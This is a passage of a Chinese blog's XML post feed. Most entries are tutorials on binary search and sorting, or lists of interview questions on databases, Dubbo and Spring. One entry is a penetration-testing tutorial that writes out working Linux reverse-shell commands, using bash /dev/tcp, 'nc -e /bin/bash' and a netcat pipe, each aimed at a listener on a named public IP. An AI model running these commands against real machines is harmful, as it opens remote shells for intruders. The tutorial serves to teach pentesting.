= mid + 1; &#125; &#125; return -1;&#125; 如果a[mid] 小于要查找的值value，那要查找的值肯定在[mid+1, high]之间，所以我们更新low = mid + 1。 对于a[mid] 大于等于给到你告知value的情况，我们要先看下这个a[mid]是不是我们要找的第一个值大于等于给定值的元素。如果a[mid]的前面已经没有元素，或者前面一个元素小于要查找的值value，那a[mid]就是我们要找的元素，这段逻辑对应的代码是第7行。 如果a[mid-1]也大于等于要查找的值value，那说明我们要查找的元素在[low, mid-1]之间，所以我们将high更新为mid-1。 变体3：查找最后一个值小于等于给定值的元素 现在，我们来看最后一种二分查找的变形问题，查找最后一个值小于等于给定值的元素。比如，数组中存储了这样一组数据：3,5,6,8,9,10。最后一个小于等于7的元素是6.是不是有点类似上面那一种？实际上实现思路也是类似的。 有了前面的基础，你完全可以自己写出来了，所以我就不详细分析了。你可以自己写一下然后对比一下。 1234567891011121314151617public int binarySearch04(int[] a, int n, int value)&#123; int low = 0; int high = n-1; while(low &lt;= high) &#123; int mid = low + ((high - low) &gt;&gt; 1); if (a[mid] &lt;= value) &#123; if (mid == n-1 || a[mid + 1] &gt; value) &#123; return mid; &#125;else &#123; low = mid + 1; &#125; &#125;if (a[mid] &gt; value) &#123; high = mid - 1; &#125; &#125; return -1；&#125; 解答开篇 好了，现在我们来看开篇的问题：如何快速定位出一个IP地址的归属地？ 现在这个问题应该很简单了。如果IP区间与归属地的对应关系不经常更新，我们可以预先处理这12万条数据，让其按照起始IP从小到大排序。如何来排序呢？我们知道IP地址可以转化为32位的整型数，所以我们可以将起始IP地址按照对应的整型值的大小关系，从小到大进行排序。 然后这个问题就可以转化为我们刚讲的第四种变形问题”在有序数组中，查找最后一个等于某个给定值的元素”了。 当我们要查找某个IP归属地时，我们可以先通过二分查找，找到最后一个起始IP小于等于这个IP的IP区间，如果在，我们就取出对应的归属地显示；如果不在，就返回未查找到。 内容小结 上一节说过，凡是用二分查找能解决的，绝大部分我们更倾向于用散列表和二叉查找树。即便是二分查找在内存使用上更节省，但是毕竟内存如此紧缺的情况并不多，那二分查找真的没什么用处了吗？ 实际上，上一节讲的求”值等于给定值”的二分查找缺失不怎么会被用到，二分查找更适合用在”近似”查找问题，在这类问题上，二分查找的优势更明显。比如今天讲的这几种变体问题，用其他数据结构，如散列表、二叉树，就比较难实现了。 变体的二分查找算法写起来非常烧脑，很容易因为细节处理不好而产生bug，这些容易出错的细节有：终止条件、区间上下界更新方法、返回值选择。所以今天讲的内容你最好能自己实现一遍，对锻炼编码能力、逻辑思维、写出bug free代码，会很有帮助。 课后思考我们今天讲的都是非常规的二分查找问题，今天的思考题也是一个非常规的二分查找问题。如果有序数组是一个循环有序数组，比如4,5,6,1,2,3。针对这种情况，如何实现一个求”值等于给定值”的二分查找算法呢？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-二分查找(上)]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-%E4%B8%8A.html</url>
    <content type="text"><![CDATA[前言 今天我们将一种针对有序数据集合的查找算法：二分查找（Binary Search）算法，也叫折半查找算法。二分查找算法的思想非常简单，很多计算机专业的同学很容易就能理解，但是看似简单的东西有时候很难掌握，想要灵活运用就更加困难。 我们先来看一道思考题：假设我们有1000万个整数数据，每个数据占8个字节，如何设计数据结构和算法，快速判断某个整数是否出现在这1000万个数据中？，我们希望这个功能不要占用太多的内存空间，最好不要查过100MB，你会怎么做呢？带着这个问题，开始学习今天的内容。 无处不在的二分思想 二分查找是一种非常简单易懂的快速查找算法，生活中到处可见。比如说，我们现在来做一个猜字游戏。我随机写一个0到99之间的数字，然后你来猜我写的是什么。猜的过程中，你每猜一次，我就会告诉你猜的大了还是小了，直到猜中为止。你来想想，如何快速猜中我写的数字呢？ 假设我写的数字是23，你可以按照下面的步骤来试一试。 次数 猜测范围 中间数 对比大小 第一次 0-99 49 49&gt;23 第二次 0-48 24 24&gt;23 第三次 0-23 11 11&lt;23 第四次 12-23 17 17&lt;23 第五次 18-23 20 20&lt;23 第六次 21-23 22 22&lt;23 第七次 23 √ 7次就猜出来了，是不是很快？这个例子用的就是二分思想，按照这个思想，即使我让你猜的是0-999的数字，最多也只要10次就能猜中。不信的话，你试一试。 这是一个生活中的例子，我们现在回到实际的开发场景中。假设有1000条订单数据，已经按照订单金额从小到大排序，每个订单金额都不同，并且最小单元是元。我们现在想知道是否存在金额等于19元的订单。如果存在，返回订单数据，否则返回null。 最简单的办法当然是从第一个订单开始，一个一个遍历这1000个订单，知道找到金额等于19元的订单为止。但这样查找会比较慢，最坏情况下，可能要遍历完中1000条记录才能找到。那用二分查找能不能更快解决呢？ 为了方便理解，我们假设只有10个订单，订单金额分别是：8,11,19,23,27,33,45,55,67,98。 还是利用二分思想，每次都与区间的中间数据比较大小，缩小查找的范围。为了更加直观，我画了一张查找过程的图，其中，low和high表示待查找区间的下标，mid表示待查找区间中间元素下标。 看懂这两个例子，你现在对二分的思想应该掌握的妥妥的了。这里稍微总结一下，二分查找针对的是一个有序的数据集合，查找思想有点类似于分治思想，每次都通过跟区间的中间元素对比，将待查找的区间缩小为原来的一半，直到查找到相应的元素，或者区间被缩小为0。 O(logn)惊人的查找速度 二分查找是一种非常高效的查找算法，高效到什么程度呢？我们来分析一下它的时间复杂度。 我们假设数据大小是n，每次查找后数据都会缩小为原来的一半，也就是会除以2，最坏情况下，直到查找的区间被缩小为空，才停止。 被查找区间的大小变化$$ n,\ \frac n 2,\ \frac n4,\ \frac n8, …,\ \frac n{2^k} $$ 可以看出，这是一个等比数列。其中$ \frac n {2^k} = 1$时，k的值就是总共缩小的次数。而每一次缩只涉及两个数据的大小比较，所以经过了k次区间缩小操作，时间复杂度就是O(k)。通过$ \frac n {2^k} = 1$，我们可以求得$k\ =\ log_2n$。所以时间复杂度是O(logn)。 二分查找是我们目前为止遇到的第一个时间复杂度为O(logn)的算法。后面我们还会讲堆、二叉树的操作等，他们的时间复杂度也是O(logn)。我这里就在深入讲讲O(logn)这种对数时间复杂度。这是一种极其高效的时间复杂度，有的时候甚至比时间复杂度是常量级O(1)的算法还要高效。为什么这么说呢？ 因为logn是一个非常“恐怖”的量级，即便n非常非常大，对应的logn也很小，比如n等于2的32次方，这个数很大了吧？大约是42亿。也就是说，如果我们在42亿个数据中用二分查找一个数据，最多需要比较32次。 我们前面讲过，用大O表示法表示时间复杂度的时候，会省略掉常数、系数和低阶。对于常量级时间复杂度的算法来说，O(1)有可能表示的是一个非常大的常数量，比如O(1000)、O(10000)。所以常量级时间复杂度的算法有时候可能还没有O(logn)的算法执行效率高。 反过来，对数对应的就是指数。有一个非常著名的“阿基米德与国王下棋的故事”，你可以自行搜索一下，感受一下指数的”恐怖”。这也是为什么我们说，指数级时间复杂度的算法在大规模数据面前是无效的。 二分查找的递归实现与非递归实现 实际上，简单的二分查找并不难写，注意这里的”简单”二字。下一节，我们会讲到二分查找的变体问题，那才是烧脑的。今天，我们来看看如果写简单的二分查找。 最简单的情况就是有序数组中不存在重复的元素，我们在其中用二分查找值等于给定值的数据，我用Java代码实现了一个简单的二分查找算法。 1234567891011121314151617181920// a 有序数组// n 数组大小// value 待查找的元素public int binarySearch(int[] a, int n, int value)&#123; int low = 0; int high = n-1; while(low &lt;= high)&#123; int mid = (high + low)/2; if(a[mid] == value) &#123; return mid; &#125; else if(a[mid] &lt; value) &#123; low = mid + 1; &#125; else&#123; high = mid -1; &#125; &#125; return -1;&#125; 这段代码我稍微解释一下，low、high、mid都是指数组下标，其中，low和high表示当前查找的区间范围，初始low=0，high=n-1。mid表示[low、high]的中间位置。我们通过对比a[mid] 和value的大小，来更新接下来要查找的区间范围，知道找到或者区间缩小为0，就退出。如果你有一些编程基础，看懂这些应该不难。现在，我们着重看一下容易出错的3个地方。 1、循环退出条件 注意是low&lt;=high， 而不是low &lt; high 2、mid的取值 实际上，mid=(low+high)/2 这种写法是有问题的，因为如果low和high比较大的话，两者之和就有可能会溢出。改进方案是将mid的计算方式改写成low+(high-low)/2，更进一步，如果要将性能优化到极致的话，我们可以将除2的操作转化为位运算low+((high-low)&gt;&gt;1)，因为相比较除法运算来说，计算机处理位运算要快得多。 3、low和high的更新 low=mid+1，high=mid-1,。注意这里的+1和-1，如果直接写成low=mid或者high=mid，就可能会发生死循环。比如，当high=3，low=3时，如果a[3]不等于value，就会导致一直循环不退出。 如果你已经留意到上面讲到的三点，我想你已经可以实现一个简单的二分查找了。实际上，二分查找除了用循环来实现，还可以用递归来实现，过程也非常简单。 12345678910111213141516public int binarySearch(int[] a,int n, int value)&#123; return binarySearch(int[] a, 0, n-1, value);&#125;public int binarySearch(int[] a, int low, int high, int value)&#123; if(low &gt; high) return -1; int mid = low + ((high-low)&gt;&gt;1); if(a[mid] == value) &#123; return mid; &#125;else if(a[mid] &lt; value) &#123; return binarySearch(a, mid+1, high, value); &#125;else&#123; return binarySearch(a, low, mid-1, value); &#125;&#125; 二分查找应用场景的局限性 前面我们分析过，二分查找的时间复杂度是O(logn)，查找数据的效率非常高。不过，并不是什么情况下都可以用二分查找，他的应用场景是有很大局限性的。那么什么情况下适合用二分查找，什么情况下不适合呢？ 首先，二分查找依赖的是顺序表结构，简单点说就是数组 那二分查找能否依赖其他数据结构呢？比如链表，答案是不可以，主要是二分查找算法需要按照下标随机访问元素。我们在数组和链表那两节讲过，数组按照下标随机访问数据的时间复杂度是O(1)，而链表随机访问的时间复杂度是O(n)。所以，如果数据使用链表存储，二分查找的时间复杂度就会变得很高。 二分查找只能用在数据是通过顺序表来存储的数据结构上，如果你的数据是通过其他结构存储的，则无法应用二分查找。 其次，二分查找针对的是有序数据 二分查找对这一点的要求比较严苛，数据必须是有序的。如果数据没有序，我们需要先排序。前面章节我们讲过，排序时间复杂度最低的是O(nlogn)。所以，如果我们针对的是一组静态数据，没有频繁地插入、删除，我们可以进行一次排序，多次二分查找。这样排序的成本可被均摊，二分查找的边际成本就会比较低。 但是，如果我们的数据集合有频繁的插入、删除操作，要想用二分查找，要么每次插入、删除操作之后保证数据仍然有序，要么在每次二分查找之前都要先进行排序。针对这种动态数据集合，无论哪种方法，维护有序的成本都是很高的。 所以二分查找只能用在插入、删除操作不频繁，一次排序多次查找的场景中。针对动态变化的数据集合，二分查找将不再适用。针对动态的数据集合，如何在其中快速查找某个数据呢？等到二叉树那一节会详细讲。 再次，数据量太小不太适合二分查找. 如果要处理的数据量太小，完全没有必要使用二分查找，顺序遍历就可以了。比如我们在一个大小为10的数组中查找一个元素，不管是用二分查找，还是顺序遍历，查找速度都差不多。只有数据量较大的时候，二分查找的优势才比较明显。 不过，这里有一个例外，如果数据之间的比较操作比较耗时，不管数据量大小，都推荐使用二分查找。比如数组中存储的数据都是长度查过300的字符串，如此长的两个字符串之间比对大小，就会非常耗时。我们需要尽可能煎炒比较次数，而比较次数的减少会大大提高性能能，这个时候二分查找就比顺序遍历更有优势。 最后，数据量太大也不适合用二分查找 二分查找的底层需要依赖数组这种数据结构，而数组为了支持随机访问的特性，要求内存空间连续，对内存空间的要求比较严苛。比如，我们有1GB大小的数据，如果希望用数组来存储，那就需要1GB的连续内存空间。 注意这里的”连续”二字，也就是说，即便有2GB的内存空间剩余，如果没有连续的1GB大小的内存空间，那照样无法申请一个1GB大小的数组。而我们的二分查找是作用在数组这种数据结构之上的，所以太大的数据用数组存储就比较吃力了，也就不能用二分查找了。 解答开篇 二分查找的理论知识你应该已经掌握了，我们来看下开篇的思考题：如何在1000万个整数中快速查找某个整数。 这个问题并不难，我们的内存限制是100MB，每个数据大小为8字节，最简单的办法就是将数据存储在数组中，内存占用差不多是80MB，符合内存的限制。借助今天讲的内容，我们可以先对这1000万个数据进行从小到大排序，然后再利用二分查找算法，就可以快速查找出想要的数据了。 看起来这个问题并不难，很轻松就能解决。实际上，它暗藏玄机，如果你对数据结构和算法有一定了解，知道散列表、二叉树这些支持快速查找的动态数据结构，你可能会觉得，用散列表、二叉树也可以解决这个问题，实际上是不行的。 虽然大部分情况下，用二分查找可以解决的问题，用散列表、二叉树都可以解决。但是，我们后面会讲到，不管是散列表还是二叉树，都会需要比较多的额外的内存空间，如果用散列表或者二叉树来存储这1000万个数据，用100MB的内存肯定是存储不下来的。而二分查找底层依赖的是数组，除了数据本身之外，不需要额外的其他信息，是最省内存空间的存储方式，所以刚好能在限定的内存大小内解决这个问题。 内容小结 今天我们学习了一种针对有序数据的一种高效的查找算法，二分查找，它的时间复杂度是O(logn)。 二分查找的算法核心思想理解起来非常简单，有点类似分治思想。即每次都通过跟区间的中间元素进行对比，将待查找的区间缩小为一半，直到找到要查找的元素，或者区间被缩小为0。但是二分查找的代码比较容易写错，你需要着重掌握三个容易出错的地方：循环退出条件、mid的取值、low和high的更新。 二分查找虽然性能比较优秀，但是应用场景比较有限。底层必须依赖数组，并且还要求数据有序。对于较小规模的数据查找，我们直接使用顺序遍历就可以了，二分查找的优势并不明显。二分查找更适合处理静态数据，也就是没有频繁的数据插入、删除操作。 课后思考1、如何编程实现”求一个数的平方根”？要求精确到小数点后6位。 2、我刚才说了，如果数据使用链表存储，二分查找的时间复杂度就会变得很高，那查找的时间复杂度究竟是多少呢？如果你自己推导一下，你就会深刻的认识到，为何我们回西安则用数组而不用链表来实现二分查找了。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-排序优化]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F%E4%BC%98%E5%8C%96.html</url>
    <content type="text"><![CDATA[前言 几乎所有的编程语言中都会提供排序函数，比如C语言中qsort()，C++ STL中的sort()、stable_sort()，还有java中Collections.sort()。在平时开发中，我们都是直接使用这些现成的函数来实现业务逻辑中的排序功能。那你知道这些排序函数是如何实现的吗？底层都利用了那些排序算法？ 基于这些问题，今天我们就来看看排序这部分的最后一块内容:如何实现一个通用的、高性能的排序算法？ 如何选择合适的排序算法？ 如果要实现一个通用的、高效率的排序函数，我们应该选择哪种排序算法？我们先回顾一下前面讲过的几种排序算法。 排序算法 时间复杂度 是否稳定排序？ 是否原地排序？ 冒泡排序 $O(n^2)$ √ √ 插入排序 $O(n^2)$ √ √ 选择排序 $O(n^2)$ × √ 归并排序 $O(n*logn)$ √ × 快速排序 $O(n*logn)$ × √ 桶排序 $O(n)$ √ × 计数排序 $O(n+k)$ √ × 基数排序 $O(dn)$ √ × 我们前面讲过，线性排序算法的时间复杂度比较低，适用场景比较特殊。所以如果要写一个通用排序函数，不能选择线性排序算法。 如果对小规模数据进行排序，可以选择时间复杂度为$O(n^2)$的排序算法，如果对大规模数据进行排序，时间复杂度是$O(n*logn)$的的算法更加高效。所以，为了兼顾任意规模数据的排序，一般都会首选时间复杂度为$O(n*logn)$的算法来实现排序函数。 时间复杂度为$O(n*logn)$的函数不止一个，我们已经讲过的有归并排序、快速排序。后面讲堆的时候我们还会讲堆排序。堆排序和快速排序都有比较多的应用，比如java语言采用堆排序实现排序函数，C语言使用排序排序实现排序函数。 不知道你有没有发现，使用归并排序的情况其实并不多。我们知道，快速排序最坏情况下时间复杂度是$O(n^2)$。而归并排序可以做到平均情况、最坏情况的时间复杂度都是$O(n*logn)$，从这点看起来很诱人，那为什么它还是没能得到“宠幸”呢？ 还记得我们上一节将的归并排序的空间复杂度吗？归并排序并不是原地排序算法，空间复杂度是$O(n)$，所以，粗略的将，如果要排序100MB的数据，除了数据本身占用的内存之外，排序算法还要额外在占用100MB的内存空间，空间消耗就翻倍了。 前面我们讲到，快速排序比较适合用来实现排序函数，但是我们也知道，快速排序在最坏情况下时间复杂度是O(n^2),如何来解决这个“复杂度恶化”问题呢？ 如何优化快速排序？ 我们先来看下，为什么最坏情况下快速排序的时间复杂度是O(n^2)呢？我们前面讲过，如果数据原来就是有序或者接近有序的，每次分区点都选择最后一个数据，那快速排序算法就会变得非常糟糕，时间复杂度就会退化为O(n^2)。实际上，这种O(n^2)时间复杂度出现的主要原因还是因为我们分区点选择的不够合理。 那什么样的分区点是好的分区点呢？或者说如何来选择分区点呢？ 最理想的分区点是：被分开的两个分区中，数据的数量差不多 如果很粗暴的直接选择第一个或者最后一个数据最为分区点，不考虑数据的特点，肯定会出现前面讲的那样，在某些情况下，排序的最坏情况时间复杂度是O(N^2)。为了提高算法的性能，我们也要尽可能的让每次分区都比较平均。 我这里介绍两种比较常用、比较简单的分区算法，你可以直观感受一下。 1、三数取中法我们从区间的首、尾、中间，分别取一个数，然后对比大小，取这三个数的中间值作为分区点。这样每间隔某个固定的长度，取数据出来比较，将中间值作为分区点的分区算法，肯定要比单纯取某一个数据更好。但是，如果要排序的数组比较大，那三数取中可能就不够了，可能要“五数取中”或者”十数取中”。 2、随机法随机法就是每次从要排序的区间中，随机选择一个元素作为分区点。这种方法并不能保证每次分区点都选的比较好，但是从概率的角度来看，也不大可能会出现每次分区点都选的很差的情况，所以平均情况下，这样选择的分区点是比较好的，时间复杂度退化为最糟糕的O(n^2)的情况，出现的可能性不大。 好了，我这里也只是抛砖引玉，如果想了解更多寻找分区点的方法，你可以自己深入学习一下。 我们知道，快速排序使用递归实现的，我们在递归那一节讲过，递归要警惕堆栈溢出，为了避免快速排序里，递归过深而堆栈过小，导致堆栈溢出，我们有两种解决办法：第一种是限制递归深度。一旦递归过深，超过了我们事先设定的阈值，就停止递归。第二种是通过在堆上模拟实现一个函数调用栈，手动模拟递归压栈、出栈的过程，这样就没有了系统栈大小的限制。 举例分析排序算法 为了让你对如何实现一个排序函数有一个更直观的感受，我那Glibc中的qsort()函数举例说明一下。虽然qsort()从名字上看，很像是基于快速排序算法实现的，实际上它并不仅仅用了快排一种算法。 如果你去看源码，你就会发现，qsort()会优先使用归并排序来排序输入数据，因为归并排序的空间复杂度是O(n),所以对于小数据量的排序，比如1KB、2KB等，归并排序额外需要1KB、2KB的内存空间，这个问题不大。现在计算机内存都挺大的，我们很多时候追求的是速度。还记得我们前面讲过的用空间换时间的技巧吗？这就是一个典型的应用。 但是如果数据量太大，就跟我们前面提到的，排序100MB的数据，这个时候我们再用归并排序就不合适了。所以，要排序的数据量比较大时，qsort()会改为采用快速排序算法来排序。 那qsort()是如何选择快速排序算法的分区点的呢？如果去看源码，你就会发现，qsort()选择分区点的方法就是”三数取中法”，是不是也不复杂？ 还有我们前面提到的递归太深会导致堆栈溢出的问题，qsort()是通过自己实现一个堆上的栈，手动模拟递归来解决的。我们之前将递归那一节也讲过，不知道你还有没有印象。 实际上，qsort()并不仅仅用到了归并排序和快速排序，它还用到了插入排序。在快速排序的过程中，当要排序的区间中，元素的个数小于等于3时，qsort()就退化为插入排序，不在继续用递归来做快速排序，因为我们前面也讲过，在小规模数据面前，O(n^2)时间复杂度的算法并不一定比O(nlogn)的算法执行时间长。 我们在讲时间复杂度的时候讲过，算法的性能可以通过时间复杂度来分析，但是这种复杂度分析是比较偏理论的，如果我们深究的话，时间上时间复杂度并不等于代码的实际执行时间。 时间复杂度代表的是一个增长趋势，如果画成增长曲线图，你会发现O(n^2)比O(nlogn)要陡峭，也就是说增长趋势要更猛一些。但是，我们前面讲过，在大O复杂度表示法中，我们会省略低阶、系数、常数，也就是说，O(nlogn)在没有省略低阶、系数、常数之前可能是O(knlogn + c)，而且k和c有可能还是一个比较大的数。 假设k=1000， c=200，当我们对小规模数据(比如n=100)排序时，n^2 的值实际上比knlogn + c还要大小。 所以对于小规模数据的排序，O(n^2)的排序算法并不一定比O(nlogn)排序算法执行的时间长。对于小数据量的排序，我们选择比较简单、不需要递归的插入排序算法。 还记得我们之前讲到的哨兵来简化代码，提高执行效率吗？在qsort()插入排序的算法实现中，也利用了这种编程技巧。虽然哨兵可能只是少做一次判断，但是毕竟排序函数是非常常用、非常基础的函数，性能的优化要做到极致。 好了，C语言的qsort()已经分析完了，有没有觉得其实也不是很难？基本上都是用了我们前面讲到的知识点，有了前面的知识点的积累，看一些底层的类库的时候是不是也更容易了？ 内容小结 今天共同分析了一下如何来实现一个工业级的通用的、高效的排序函数，内容比较偏实战，而且贯穿了一些前面的章节，你要多看几遍。我们大部分排序函数都是采用O(nlogn)排序算法来实现，但是为了尽可能地提高性能，会做很多优化。 我还重点讲了一下快速排序的一些优化策略，比如合理选择分区点，避免递归太深等等。最后，带你分析了一下C语言中qsort()的底层实现原理，希望你能对此有一个更加直观的感受。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
        <tag>排序优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux反弹shell的三种方法]]></title>
    <url>%2Fposts%2F2018-11-06-Linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[0x01 前言 在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？ 而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。 反弹shell通常是外网渗透的最后一步，也是内网渗透的第一步。反弹shell顾名思义，有两个关键词—反弹和shell。 反弹：利用命令执行/代码执行/Webshell/redis未授权访问写入crontab等漏洞，使得目标服务器发出主动连接请求，从而绕过防火墙的入站访问控制规则则。Shell：是服务器shell进程stdin/stdout/stderr重定向到攻击端。 0x02 获取shell 通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。 我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。 通过bash反弹shell第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令nc -lvvp 7777,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令bash -i &gt;$ /dev/tcp/130.211.244.96/7777 0&gt;&amp;1。 bash -i的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，&gt;&amp;将标准错误输出重定向到标准输出中，0&gt;&amp;1将标准输入重定向到标准输出中。 下面来看一下具体的效果，先在攻击机器上监听端口： 在受害机器上反弹shell： 之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。 利用netcat反弹shell如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。 同样，先在攻击机器上130.211.244.96开启监听端口nc -lvvp 7777，等待受害机器连接。 在受害机器上执行命令nc -e /bin/bash 130.211.244.96 7777,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。 利用管道反弹shellnetcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。 首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。 然后在受害机器上执行命令nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。 这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。 当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>反弹shell</tag>
        <tag>netcat</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务面试题]]></title>
    <url>%2Fposts%2F2018-11-02-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据库面试题]]></title>
    <url>%2Fposts%2F2018-11-02-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、SQL优化的常见方法2、SQL索引的顺序、字段的顺序3、查看SQL索引4、Mysql分页查询语句5、Mysql的事物特性和隔离级别 事务特性(ACID) 原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。 一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态 隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。 持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中 隔离级别： 读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读 读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读 可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读 序列化读(Serializble)：串行化顺序执行大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。 6、sql having的使用场景7、Mysql数据库的索引及原理8、锁机制介绍：行锁、表锁、排它锁、共享锁9、乐观锁的业务场景和实现方式10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么12、JDBC如何实现事务、嵌套事务实现、分布式事务实现13、SQL的整个解析过程、执行过程原理、SQL行转列14、Redis为什么这么快，Redis采用多线程会有那些问题15、Redis支持那些数据结构String 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合 16、Redsi跳表的问题17、Redsi单进程单线程如何能够高并发18、如何使用Redis实现分布式锁19、Redis分布式锁操作的原子性，Redsi内部是如何实现的20、为什么用自增列作为主键 21、MySQL的索引都有哪些 MySQL的索引分为单列索引（普通索引、唯一索引、主键索引）和组合索引。 (1) 普通索引 最基本的索引，没有任何限制 (2) 唯一索引 它与普通索引类似，不同的是索引列的值必须是唯一的，但允许有空值；如果是组合索引，则列值的组合必须唯一。 (3) 主键索引 它是一种特殊的唯一索引，不允许有空值，一般是在建表的时候创建主键索引 (4) 组合索引 多个列组成一个索引，专门用于组合搜索 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Dubbo面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Dubbo%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、Dubbo完整的一次调用链路介绍2、Dubbo支持几种负载均衡策略3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？4、Dubbo启动的时候支持几种配置方式5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？6、Spring Cloud熔断机制 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>面试</tag>
        <tag>dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Spring%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、consul的可靠性2、spring的原理，AOP/IOC原理，使用场景3、spring bean生命周期 实例化一个Bean，也就是我们常说的new 按照Spring上下文对实例化的Bean进行配置，即 IOC 注入 如果这个Bean已经实现了BeanNameAware接口，会调用它实现的setBeanName(String)方法，此处传递的就是spring配置文件中Bean的ID值 如果这个Bena已经实现了BeanFactoryAware接口，会调用它实现的setBeanFactory(BeanFactory)传递Spring工厂自身 如果这个Bean已经实现了ApplicationContextAware接口，会调用setApplicationContext(ApplicationContext)方法，传入Spring上下文 如果这个Bean关联了BenaPostProcessor接口，将会调用postProcessBeforeInitialization(Object obj, String s)方法，BeanPostPorcessor经常被用作Bean内容的更改，并且由于这个是在Bena初始化结束时调用哪个的方法，也可以被应用于内存或缓存技术。 如果Bena在Spring配置文件中配置了init-method属性会自动调用其配置的初始化方法。 如果这个Bean关联了BeanPostProcessor接口，将会调用postPorcessAfterInitialization(Object obj, String s)方法 以上工作完成之后就可以应用这个Bean了，那这个Bean是一个Singleton的，所以一般情况下我们调用同一个ID的Bean会是在内容地址相同的实例，当然在Spring配置文件中也可以配置非Singleton 当Bena不再需要时，会经过清理阶段，如果Bean实现了DisposableBena接口，会调用其实现的destroy()方法 最后，如果这个Bean在Spring中配置了destroy-method属性，会自动调用其配置的销毁方法。 4、什么是依赖注入DI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。 5、Spring在SSM中起什么作用 spring： 是一个轻量级框架 作用： Bean工厂，用来管理Bean的声明周期和框架集成 两大核心： IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory AOP：面向切面编程 6、Spring的事务 编程式事务： 编程方式管理事务，灵活，但难管理 声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务 